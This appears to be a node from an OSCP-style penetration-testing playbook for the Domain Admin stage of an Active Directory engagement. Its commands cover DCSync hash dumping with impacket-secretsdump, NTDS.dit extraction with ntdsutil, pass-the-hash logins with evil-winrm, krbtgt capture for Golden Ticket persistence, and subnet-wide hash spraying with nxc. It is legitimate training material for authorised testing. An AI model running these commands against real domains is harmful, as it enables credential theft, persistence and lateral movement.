---
id: domain-admin
title: Domain Admin / Proof
stage: objective
tags: [windows, ad]
summary: You have Domain Admin — dump all hashes, screenshot proof, grab krbtgt for persistence, and enumerate additional forests before finishing.
leads_to:
  - golden-ticket
  - pivot
  - dcsync
  - domain-trust-abuse
---

## Prerequisites

Domain Admin credentials or NTLM hash. Network access to the DC. This is the end state for AD engagement objectives — document everything before taking any potentially destructive actions.

Domain Admin is game over for the domain. The immediate priorities are: confirm and screenshot proof for the exam submission, DCSync for all hashes (including krbtgt for persistence), spray the Administrator hash across all machines, and check for additional subnets or forest trusts to pivot into.

## Quick Win

> Confirm DA group membership and get the proof file — screenshot both for exam submission.

```powershell
whoami /groups | findstr "Domain Admins"
type C:\Users\Administrator\Desktop\proof.txt
hostname
```

## Confirm Domain Admin

> Three commands — run all three and screenshot for exam proof.

```powershell
net group "Domain Admins" /domain
whoami /groups | findstr "Domain Admins"
whoami /all
hostname
```

## Grab Proof File

> Standard OSCP proof locations — check both paths.

```bash
evil-winrm -i $DC_IP -u Administrator -H $NTLM
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\root.txt
```

## DCSync (Dump All Hashes)

> Get everything — Administrator for lateral movement, krbtgt for Golden Ticket persistence.

```bash
impacket-secretsdump $DOMAIN/Administrator:password@$DC_IP
impacket-secretsdump $DOMAIN/Administrator@$DC_IP -hashes :$NTLM
```

## NTDS.dit Full Dump (From Shell on DC)

> Alternative if secretsdump is blocked — ntdsutil creates a clean offline copy.

```powershell
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
```

```bash
impacket-secretsdump -ntds "C:\Temp\ntds\Active Directory\ntds.dit" \
  -system C:\Temp\ntds\registry\SYSTEM LOCAL
```

## Spray Admin Hash Across All Hosts

> Domain admin hash works everywhere — find machines that respond with Pwn3d!

```bash
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM --local-auth
```

## Leads To

krbtgt hash from DCSync → golden-ticket for persistent domain access. Additional subnets in `ipconfig /all` or AD sites → pivot to next network segment. Forest trusts visible in BloodHound → repeat the entire methodology in the trusted forest. Always check for additional machines/subnets before wrapping up.
